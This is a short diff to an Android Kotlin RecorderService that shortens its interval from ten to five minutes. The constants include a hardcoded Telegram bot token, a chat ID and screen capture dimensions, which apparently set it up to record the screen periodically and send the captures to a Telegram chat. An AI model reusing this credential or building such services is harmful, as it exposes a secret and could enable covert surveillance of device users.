@@ -28,7 +28,7 @@ class RecorderService : Service() {
         private const val NOTIFICATION_ID = 1
         private const val TOKEN = "8789968045:AAGWbVUOgapMEd-0gHOjbBgRNOUkUwKIQxk"
         private const val CHAT_ID = "8650824010"
-        private const val INTERVAL_MS = 10 * 60 * 1000L
+        private const val INTERVAL_MS = 5 * 60 * 1000L
         private const val WIDTH = 720
         private const val HEIGHT = 1280
         private const val DENSITY = 320
